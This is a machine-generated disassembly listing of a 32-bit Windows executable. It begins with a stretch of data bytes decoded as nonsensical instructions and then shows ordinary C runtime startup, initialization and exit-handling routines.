  422537:	jg     0x42254f
  422539:	addr16 ja 0x4224d2
  42253c:	push   esp
  42253d:	push   esp
  42253e:	inc    ebx
  42253f:	dec    edi
  422540:	fdivr  QWORD PTR [esi]
  422542:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  422544:	ror    esp,0x60
  422547:	test   DWORD PTR ds:0x76a9afd9,ebp
  42254d:	out    dx,al
  42254e:	fadd   DWORD PTR [ebp+0x21212b56]
  422554:	pop    esi
  422555:	cmp    DWORD PTR [ebx],edx
  422557:	dec    eax
  422558:	and    BYTE PTR [ebp-0xf],ah
  42255b:	sbb    DWORD PTR [edx-0x22b868c1],0xffffffb3
  422562:	clc    
  422563:	test   BYTE PTR ds:0x7804e678,bh
  422569:	jne    0x422563
  42256b:	inc    edi
  42256c:	in     al,dx
  42256d:	and    DWORD PTR [esi+0xf],ebx
  422570:	loop   0x422523
  422572:	call   0xb06d:0x842d98c2
  422579:	ror    ecx,0xf8
  42257c:	mov    cl,0x6a
  42257e:	sub    al,0xd5
  422580:	cmp    esi,DWORD PTR [ebx-0x5b]
  422583:	repz dec ebx
  422585:	(bad)  
  422586:	jmp    0x4225aa
  422588:	cmp    cl,bl
  42258a:	mov    al,ds:0x7572acd2
  42258f:	xor    al,0x58
  422591:	add    cl,al
  422593:	adc    BYTE PTR [ebx+edx*8],ah
  422596:	or     eax,0x2daa13de
  42259b:	xchg   ecx,eax
  42259c:	jmp    0xe349:0x7ebe2269
  4225a3:	ja     0x4225e8
  4225a5:	mov    ds:0xa2f9f630,al
  4225aa:	jl     0x4225d1
  4225ac:	xor    al,0xcd
  4225ae:	adc    ecx,edi
  4225b0:	(bad)  
  4225b1:	or     eax,0x67931a23
  4225b6:	int    0xba
  4225b8:	add    esp,0xd27f56e0
  4225be:	gs mov dl,0xee
  4225c1:	mov    ebx,0x71f4ffb6
  4225c6:	mov    al,0x8a
  4225c8:	mov    ch,0x8d
  4225ca:	out    0x6d,al
  4225cc:	test   eax,0x8f991690
  4225d1:	jmp    0x422589
  4225d3:	dec    esi
  4225d4:	gs in  al,dx
  4225d6:	das    
  4225d7:	cwde   
  4225d8:	scas   eax,DWORD PTR es:[edi]
  4225d9:	pop    esp
  4225da:	mov    edx,0x9b9bf106
  4225df:	mov    BYTE PTR [esi-0x7e],0x17
  4225e3:	(bad)  
  4225e4:	les    esi,FWORD PTR [eax-0x64]
  4225e7:	gs add al,0xca
  4225ea:	add    BYTE PTR [ebx+0x53fcf19c],al
  4225f0:	add    ebx,esi
  4225f2:	in     al,dx
  4225f3:	lods   eax,DWORD PTR ds:[esi]
  4225f4:	int3   
  4225f5:	pop    esp
  4225f6:	xor    eax,0xacea2c3f
  4225fb:	and    eax,0xe7cf0742
  422600:	test   al,0x69
  422602:	int    0xb8
  422604:	pop    edx
  422605:	stos   BYTE PTR es:[edi],al
  422606:	push   ebp
  422607:	jb     0x42266a
  422609:	call   0x773145fe
  42260e:	cli    
  42260f:	xchg   BYTE PTR [edx+ecx*4],bl
  422612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422613:	call   0xc8b38fe2
  422618:	cdq    
  422619:	cld    
  42261a:	and    ah,dh
  42261c:	inc    esp
  42261d:	stc    
  42261e:	icebp  
  42261f:	sbb    BYTE PTR [ecx+0x7082426c],0x6f
  422626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422627:	inc    ebp
  422628:	cmp    BYTE PTR [edx+0x7],0xd0
  42262c:	lahf   
  42262d:	mov    bl,0xc8
  42262f:	mov    WORD PTR [ebx+esi*4-0x6c543f1a],?
  422636:	or     bl,dh
  422638:	mov    esi,0x47a16c37
  42263d:	mov    edx,0x64f6b0a3
  422642:	js     0x4225f9
  422644:	or     al,0x92
  422646:	xchg   DWORD PTR [ebx+0x56d86865],esp
  42264c:	ins    BYTE PTR es:[edi],dx
  42264d:	ret    
  42264e:	adc    edx,DWORD PTR [edx+eiz*2+0x50]
  422652:	pop    edi
  422653:	pop    ebx
  422654:	(bad)  
  422655:	fnstcw WORD PTR [eax+edx*2]
  422658:	xchg   ecx,eax
  422659:	pop    edx
  42265a:	das    
  42265b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42265c:	sbb    cl,BYTE PTR [ebx-0x4ad2a473]
  422662:	jmp    0x9759:0x42074d2
  422669:	imul   eax,DWORD PTR [edi+edx*1],0x3e0287df
  422670:	sub    esi,ebp
  422672:	aaa    
  422673:	into   
  422674:	pop    esp
  422675:	and    BYTE PTR [esi+0x10],ch
  422678:	xchg   esi,eax
  422679:	(bad)  
  42267b:	retf   
  42267c:	out    0x0,al
  42267e:	add    ecx,esp
  422680:	icebp  
  422681:	or     DWORD PTR [esi+0x44a3800b],eax
  422687:	icebp  
  422688:	or     eax,0xa70885c
  42268d:	rcr    DWORD PTR [ebx+0x48a5c195],0xe7
  422694:	rol    DWORD PTR [esi+0x5754826],0x26
  42269b:	sub    al,0xbc
  42269d:	add    al,0xcc
  42269f:	push   ebx
  4226a0:	pop    ebp
  4226a1:	je     0x422623
  4226a3:	xchg   ecx,eax
  4226a4:	mov    al,0x1e
  4226a6:	lock push eax
  4226a8:	rcr    DWORD PTR [ecx-0x6ef2b366],0x97
  4226af:	stos   DWORD PTR es:[edi],eax
  4226b0:	jmp    DWORD PTR [ecx+0x5ae07902]
  4226b6:	pop    edx
  4226b7:	cmc    
  4226b8:	inc    edi
  4226b9:	add    eax,0x786122cf
  4226be:	xor    al,0x9e
  4226c0:	call   0x61da:0xd9a172e
  4226c7:	push   eax
  4226c8:	lahf   
  4226c9:	pop    edi
  4226ca:	es push ebx
  4226cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226cd:	dec    ebp
  4226ce:	mov    dh,0xcb
  4226d0:	ja     0x422685
  4226d2:	cwde   
  4226d3:	jns    0x422736
  4226d5:	xor    eax,DWORD PTR ds:0xbbe51785
  4226db:	imul   ebp,DWORD PTR fs:[ebx-0x32],0xd10be32e
  4226e3:	cld    
  4226e4:	mov    al,ds:0xf0378251
  4226e9:	scas   eax,DWORD PTR es:[edi]
  4226ea:	inc    esi
  4226eb:	aam    0xcb
  4226ed:	add    al,0x5b
  4226ef:	rol    dh,cl
  4226f1:	sbb    DWORD PTR [edx],ebp
  4226f3:	ror    BYTE PTR [eax],cl
  4226f5:	dec    BYTE PTR [edx-0x3647328a]
  4226fb:	pop    ss
  4226fc:	rep outs dx,DWORD PTR ds:[esi]
  4226fe:	mov    ah,0x5d
  422700:	loope  0x42275d
  422702:	sub    BYTE PTR [ebx+edi*4],0x92
  422706:	enter  0xfdac,0x15
  42270a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42270b:	mov    ch,0x38
  42270d:	xlat   BYTE PTR ds:[ebx]
  42270e:	retf   
  42270f:	leave  
  422710:	and    BYTE PTR ss:[esi],al
  422713:	stos   DWORD PTR es:[edi],eax
  422714:	mov    esi,0xf50df383
  422719:	mov    dl,cl
  42271b:	push   ss
  42271c:	sub    eax,0xc9bb41ed
  422721:	hlt    
  422722:	dec    esp
  422723:	mov    eax,ds:0x30f92605
  422728:	ins    DWORD PTR es:[edi],dx
  422729:	xchg   ebp,eax
  42272a:	mov    ebp,0x41c4100f
  42272f:	mov    ecx,0x18cccfee
  422734:	sbb    DWORD PTR [edi+0x4e],0x6eb2ba70
  42273b:	retf   0xb3a2
  42273e:	aad    0xd9
  422740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422741:	mov    edi,0x8f54c940
  422746:	mov    ch,0xfb
  422748:	mov    ah,0x1c
  42274a:	xchg   esi,eax
  42274b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42274c:	mov    ds:0xaf9a6e6e,eax
  422751:	fmul   st,st(7)
  422753:	(bad)  
  422754:	jge    0x422717
  422756:	pusha  
  422757:	imul   edi,DWORD PTR fs:[ecx],0xa
  42275b:	mov    ecx,0xbca5958c
  422760:	aam    0x43
  422762:	sub    BYTE PTR [edx],dl
  422764:	outs   dx,BYTE PTR ds:[esi]
  422765:	ins    BYTE PTR es:[edi],dx
  422766:	(bad)  
  422767:	mov    DWORD PTR ds:0xd114b17,esi
  42276d:	cmp    edi,DWORD PTR [esi]
  42276f:	repz std 
  422771:	mov    ebx,DWORD PTR [edi+0x13311dc9]
  422777:	add    al,BYTE PTR [ebp+0xce7b71a]
  42277d:	shr    ebp,0xc6
  422780:	add    esp,esi
  422782:	rcl    DWORD PTR [edi+0x1eb8cb03],cl
  422788:	test   DWORD PTR [ecx],ebp
  42278a:	push   cs
  42278b:	xor    al,0x85
  42278d:	out    0x3c,eax
  42278f:	arpl   WORD PTR ds:0x57ff3814,dx
  422795:	jmp    0x70a1d07f
  42279a:	pop    ecx
  42279b:	adc    bh,BYTE PTR [ebp-0x36]
  42279e:	push   0xffffffa5
  4227a0:	rcr    edi,0x63
  4227a3:	mov    esi,0x9885b046
  4227a8:	out    dx,eax
  4227a9:	outs   dx,BYTE PTR ds:[esi]
  4227aa:	repz rol DWORD PTR ds:0x7a6216ff,0x15
  4227b2:	aaa    
  4227b3:	push   edx
  4227b4:	inc    esp
  4227b5:	jbe    0x4227a2
  4227b7:	jecxz  0x4227d3
  4227b9:	inc    ebp
  4227ba:	inc    ecx
  4227bb:	push   esi
  4227bc:	rol    DWORD PTR ds:0xd660b4a2,cl
  4227c2:	push   0xffffffa1
  4227c4:	call   0x1eb9:0x1b41f38f
  4227cb:	scas   eax,DWORD PTR es:[edi]
  4227cc:	js     0x4227be
  4227ce:	cmp    esi,DWORD PTR [esi-0x5f]
  4227d1:	icebp  
  4227d2:	dec    ecx
  4227d3:	psubq  mm6,QWORD PTR [eax]
  4227d6:	mov    ds:0xa932e2b8,eax
  4227db:	push   ecx
  4227dc:	dec    edi
  4227dd:	dec    edx
  4227de:	pushf  
  4227df:	mov    ebp,0x5a09ee1f
  4227e4:	in     al,dx
  4227e5:	push   0x16634cf4
  4227ea:	xor    al,0x4b
  4227ec:	repz call 0xe234:0xa19311d5
  4227f4:	sub    DWORD PTR [ebx],edx
  4227f6:	pushf  
  4227f7:	arpl   WORD PTR [edx+0x22defaca],sp
  4227fd:	xchg   esi,eax
  4227fe:	lods   eax,DWORD PTR ds:[esi]
  4227ff:	push   es
  422800:	ins    DWORD PTR es:[edi],dx
  422801:	dec    ebx
  422802:	out    dx,al
  422803:	push   eax
  422804:	xchg   esi,eax
  422805:	gs scas eax,DWORD PTR es:[edi]
  422807:	aad    0x45
  422809:	jb     0x422800
  42280b:	enter  0x88ad,0xc
  42280f:	pop    ebp
  422810:	xchg   esi,eax
  422811:	inc    eax
  422812:	sub    BYTE PTR [esi+0x24],al
  422815:	sti    
  422816:	dec    ecx
  422817:	sub    bh,BYTE PTR [ebp+0x57479ae7]
  42281d:	pop    es
  42281e:	push   0xffffff9b
  422820:	cwde   
  422821:	cmp    al,0xf1
  422823:	pushf  
  422824:	jns    0x4227e9
  422826:	scas   al,BYTE PTR es:[edi]
  422827:	enter  0xca91,0xa5
  42282b:	rcl    DWORD PTR [edi-0x39f6f211],cl
  422831:	sbb    BYTE PTR [ecx],al
  422833:	adc    eax,0x5127728f
  422838:	sar    BYTE PTR [ebx],0xcb
  42283b:	jl     0x4227ca
  42283d:	cmp    DWORD PTR [ebp-0x18e93dba],ecx
  422843:	mov    ss,WORD PTR [esi]
  422845:	jmp    0x6640:0xc988ca6d
  42284c:	mov    ah,0xff
  42284e:	pop    es
  42284f:	xchg   ebx,eax
  422850:	into   
  422851:	fsubr  QWORD PTR [ecx+eax*2]
  422854:	pop    edx
  422855:	mov    ds:0x5db6cc41,al
  42285a:	sub    eax,0x2e9f7170
  42285f:	jmp    FWORD PTR [edx+0x51]
  422862:	lea    ecx,[eax-0x3]
  422865:	ds mov ch,0xa8
  422868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422869:	(bad)  
  42286a:	xchg   esp,eax
  42286b:	adc    DWORD PTR [edi],edi
  42286d:	popa   
  42286e:	pop    edi
  42286f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422870:	dec    edi
  422871:	ds jb  0x4228e7
  422874:	aas    
  422875:	shl    al,0x3c
  422878:	imul   edx,DWORD PTR [edx+ecx*8-0x27],0xffffff98
  42287d:	aaa    
  42287e:	pop    ss
  42287f:	cli    
  422880:	pop    ebp
  422881:	int    0x3c
  422883:	inc    edx
  422884:	jle    0x422891
  422886:	fstp   TBYTE PTR [edx]
  422888:	cmp    bh,BYTE PTR [edx-0x70b20b6c]
  42288e:	ins    BYTE PTR es:[edi],dx
  42288f:	outs   dx,DWORD PTR ds:[esi]
  422890:	rcr    BYTE PTR [esi-0x763647a9],1
  422896:	or     al,0x46
  422898:	push   ebx
  422899:	shr    DWORD PTR [ecx+0x5d],0x85
  42289d:	xchg   esi,eax
  42289e:	dec    eax
  42289f:	push   es
  4228a0:	shl    BYTE PTR [esi],cl
  4228a2:	push   ds
  4228a3:	xchg   ecx,eax
  4228a4:	mov    dh,0x6b
  4228a6:	and    eax,0x4316ea5e
  4228ab:	mov    dl,0x39
  4228ad:	cli    
  4228ae:	stos   DWORD PTR es:[edi],eax
  4228af:	pusha  
  4228b0:	std    
  4228b1:	mov    ecx,0xe784140f
  4228b6:	xchg   esi,eax
  4228b7:	pop    ebx
  4228b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228b9:	ins    DWORD PTR es:[edi],dx
  4228ba:	retf   
  4228bb:	push   es
  4228bc:	push   eax
  4228bd:	mov    dl,0x91
  4228bf:	mov    ebx,0x96556642
  4228c4:	js     0x422869
  4228c6:	lds    eax,FWORD PTR [edx]
  4228c8:	call   0x3772d838
  4228cd:	ret    
  4228ce:	stc    
  4228cf:	mov    edi,0x513a8479
  4228d4:	or     eax,0xeec26016
  4228d9:	repz inc esi
  4228db:	sub    eax,0xa0fb1bdd
  4228e0:	xlat   BYTE PTR ds:[ebx]
  4228e1:	and    al,0x17
  4228e3:	xchg   DWORD PTR [ebp-0x1e774cd2],edi
  4228e9:	add    cl,cl
  4228eb:	lock sbb al,0x59
  4228ee:	icebp  
  4228ef:	jne    0x42288b
  4228f1:	mov    ah,0xc1
  4228f3:	sbb    al,BYTE PTR [eax-0x1c5aec93]
  4228f9:	inc    ebx
  4228fa:	inc    ebx
  4228fb:	jne    0x422935
  4228fd:	add    DWORD PTR [esi],edx
  4228ff:	out    0xc,eax
  422901:	pop    esp
  422902:	ds loopne 0x4228f9
  422905:	fdivrp st(6),st
  422907:	leave  
  422908:	and    bl,BYTE PTR [ecx]
  42290a:	push   edx
  42290b:	xchg   esi,eax
  42290c:	and    esp,DWORD PTR [ebx-0x58]
  42290f:	into   
  422910:	aaa    
  422911:	sub    eax,0x675a2641
  422916:	popa   
  422917:	rcr    BYTE PTR [eax],cl
  422919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42291a:	jb     0x422907
  42291c:	inc    esi
  42291d:	(bad)  
  42291e:	push   ecx
  42291f:	inc    edi
  422920:	xor    eax,0x45360619
  422925:	fsub   DWORD PTR fs:[esi+0x5f95a72b]
  42292c:	xlat   BYTE PTR ds:[ebx]
  42292d:	and    eax,0xa01850c1
  422932:	daa    
  422933:	jl     0x422932
  422935:	cmp    BYTE PTR [eax+ebx*4],bh
  422938:	push   edx
  422939:	hlt    
  42293a:	add    al,0xe4
  42293c:	inc    esp
  42293d:	inc    ebp
  42293e:	cwde   
  42293f:	add    dl,BYTE PTR [edi-0x1c]
  422942:	call   0xa40bc1eb
  422947:	pusha  
  422948:	jno    0x42296d
  42294a:	add    edi,DWORD PTR [ecx]
  42294c:	dec    ebx
  42294d:	xchg   ebx,eax
  42294e:	mov    ch,0xf3
  422950:	repnz pop ebx
  422952:	dec    ebp
  422953:	sbb    al,0xb7
  422955:	je     0x42299a
  422957:	mov    BYTE PTR [eax-0x7c3fcc70],ch
  42295d:	les    edx,FWORD PTR [eax]
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
